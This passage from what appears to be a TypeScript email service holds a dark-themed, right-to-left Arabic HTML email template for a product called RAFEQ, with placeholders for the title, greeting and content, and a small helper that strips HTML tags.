<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl" lang="ar">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="x-apple-disable-message-reformatting" />
  <meta name="color-scheme" content="light only" />
  <meta name="supported-color-schemes" content="light only" />
  <title>RAFEQ</title>
  <style type="text/css">
    :root { color-scheme: light only; }
    @media only screen and (max-width: 600px) {
      .container { width: 100% !important; }
      .content-padding { padding: 24px 20px !important; }
    }
  </style>
</head>
<body style="margin: 0; padding: 0; background-color: #0f172a; font-family: Arial, Tahoma, sans-serif;" bgcolor="#0f172a">
  
  <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0f172a;" bgcolor="#0f172a">
    <tr>
      <td align="center" style="padding: 32px 16px;">
        
        <table role="presentation" class="container" cellpadding="0" cellspacing="0" width="520" style="max-width: 520px;">
          
          <!-- LOGO -->
          <tr>
            <td align="center" style="padding: 16px 0 28px;">
              <img src="data:image/png;base64,${LOGO_BASE64}" alt="RAFEQ" width="200" height="53" style="display: block; max-width: 200px; height: auto;" />
            </td>
          </tr>
          
          <!-- MAIN CARD -->
          <tr>
            <td>
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border-radius: 20px; border: 1px solid #334155;" bgcolor="#1e293b">
                <tr>
                  <td>
                    <div style="height: 5px; background: linear-gradient(90deg, #2dd4bf 0%, #8b5cf6 50%, #a855f7 100%); border-radius: 20px 20px 0 0;"></div>
                  </td>
                </tr>
                <tr>
                  <td class="content-padding" style="padding: 36px 32px;">
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 16px;">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="64" height="64" style="background-color: #334155; border-radius: 50%; text-align: center; vertical-align: middle;" bgcolor="#334155">
                                <span style="font-size: 28px; line-height: 64px;">${icon}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center">
                          <h1 style="margin: 0 0 8px; font-size: 26px; font-weight: 700; color: #ffffff; font-family: Arial, sans-serif;">${title}</h1>
                        </td>
                      </tr>
                    </table>
                    ${storeBadgeHtml}
                    ${greeting ? `
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 24px;">
                          <p style="margin: 0; font-size: 15px; color: #94a3b8; line-height: 1.7; font-family: Arial, sans-serif;">${greeting}</p>
                        </td>
                      </tr>
                    </table>
                    ` : ''}
                    ${content}
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
          ${featuresHtml}
          
          <!-- FOOTER -->
          <tr>
            <td style="padding: 0 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr><td style="height: 1px; background-color: #334155;" bgcolor="#334155"></td></tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding: 24px 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td align="center" style="padding-bottom: 8px;">
                    <span style="font-size: 12px; color: #64748b; font-family: Arial, sans-serif;">تحتاج مساعدة؟</span>
                  </td>
                </tr>
                <tr>
                  <td align="center" style="padding-bottom: 16px;">
                    <a href="mailto:support@rafeq.ai" style="font-size: 13px; color: #2dd4bf; text-decoration: none; font-family: Arial, sans-serif;">support@rafeq.ai</a>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <span style="font-size: 11px; color: #475569; font-family: Arial, sans-serif;">© ${new Date().getFullYear()} RAFEQ - صُنع بـ 💜 في السعودية</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
        </table>
        
      </td>
    </tr>
  </table>
  
</body>
</html>
    `.trim();
  }

  private stripHtml(html: string): string {
    return html.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
  }
}
